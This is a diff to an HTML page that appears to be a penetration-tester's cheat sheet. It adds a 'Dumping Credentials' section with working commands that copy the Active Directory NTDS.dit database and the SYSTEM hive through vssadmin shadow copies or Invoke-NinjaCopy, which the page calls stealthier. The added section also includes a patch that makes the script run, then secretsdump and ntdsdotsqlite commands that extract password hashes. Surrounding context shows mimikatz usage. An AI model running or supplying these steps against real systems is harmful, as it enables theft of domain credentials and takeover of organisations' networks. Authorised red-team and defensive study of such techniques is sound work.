@@ -776,6 +776,38 @@ sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> <
 <li><a href="https://www.blackhillsinfosec.com/constrained-language-mode-bypass-when-pslockdownpolicy-is-used/">Constrained Language Mode Bypass When __PSLockDownPolicy Is Used</a></li>
 </ul>
 <h3 id="dumping-credentials_1">Dumping Credentials</h3>
+<p>Exfiltrate NTDS.dit and SYSTEM registry hive (needed to decrypt the NTDS.dit) with <code>vssadmin</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Create shadow copy volume</span>
+vssadmin<span class="w"> </span>create<span class="w"> </span>shadow<span class="w"> </span>/for<span class="o">=</span>C:
+
+<span class="c1"># Copy files from shadow volume</span>
+copy<span class="w"> </span>&lt;shadow<span class="w"> </span>copy<span class="w"> </span>name&gt;<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\N</span>TDS.dit<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\n</span>tds.dit.save
+copy<span class="w"> </span>&lt;shadow<span class="w"> </span>copy<span class="w"> </span>name&gt;<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>YSTEM<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\s</span>ystem.save
+
+<span class="c1"># Delete shadow copy volume</span>
+vssadmin<span class="w"> </span>delete<span class="w"> </span>shadows<span class="w"> </span>/shadow<span class="o">=</span>&lt;shadow<span class="w"> </span>copy<span class="w"> </span>id&gt;
+</code></pre></div>
+<p>Note: using cmd instead of PowerShell <em>might</em> work better (I've experienced some issues with PS).</p>
+<p>Exfiltrate NTDS.dit and SYSTEM registry hive (needed to decrypt the NTDS.dit) with <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1">Invoke-NinjaCopy.ps1</a> (stealthier than <code>vssadmin</code>):</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Invoke-NinjaCopy</span> <span class="n">-Path</span> <span class="s2">"C:\Windows\NTDS\NTDS.dit"</span> <span class="n">-LocalDestination</span> <span class="s2">"C:\Windows\Temp\ntds.dit.save"</span>
+<span class="nb">Invoke-NinjaCopy</span> <span class="n">-Path</span> <span class="s2">"C:\Windows\System32\config\SYSTEM"</span> <span class="n">-LocalDestination</span> <span class="s2">"C:\Windows\Temp\system.save"</span>
+</code></pre></div>
+<p>If the "AmbiguousMatchException" is raised, try to patch the <code>Invoke-NinjaCopy.ps1</code> script as follows:</p>
+<ul>
+<li>Change the following line (910):   <code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')</code></li>
+<li>To: <code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);</code></li>
+</ul>
+<p>Parse NTDS.dit with Impacket's <code>secretsdump</code>:</p>
+<div class="highlight"><pre><span></span><code>secretsdump<span class="w"> </span>-ntds<span class="w"> </span>ntds.dit.save<span class="w"> </span>-system<span class="w"> </span>system.save<span class="w"> </span>LOCAL
+</code></pre></div>
+<p>Note: for large NTDS.dit consider using <a href="https://github.com/c-sto/gosecretsdump">gosecretsdump</a> (faster).</p>
+<p>Convert NTDS.dit to sqlite database:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Without SYSTEM registry hive</span>
+ntdsdotsqlite<span class="w"> </span>ntds.dit.save<span class="w"> </span>-o<span class="w"> </span>ntds.sqlite
+
+<span class="c1"># With SYSTEM registry hive</span>
+ntdsdotsqlite<span class="w"> </span>ntds.dit.save<span class="w"> </span>-o<span class="w"> </span>ntds.sqlite<span class="w"> </span>--system<span class="w"> </span>system.save
+</code></pre></div>
 <p>Dumping credentials with mimikatz:</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># Must return "Privilege '20' OK" </span>
 privilege::debug
@@ -826,7 +858,7 @@ sekurlsa::tickets<span class="w"> </span>/export
 <span class="c"># Run any mimikatz command</span>
 <span class="n">Inovke-Mimikatz</span> <span class="n">-Command</span> <span class="s2">"&lt;mimikatz command(s)&gt;"</span>
 </code></pre></div>
-<p>If the "AmbiguousMatchException" is raised, try to patch the Invoke-Mimikatz.ps1 script as follows:</p>
+<p>If the "AmbiguousMatchException" is raised, try to patch the <code>Invoke-Mimikatz.ps1</code> script as follows:</p>
 <ul>
 <li>Change the following line:   <code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')</code></li>
 <li>To: <code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);</code></li>
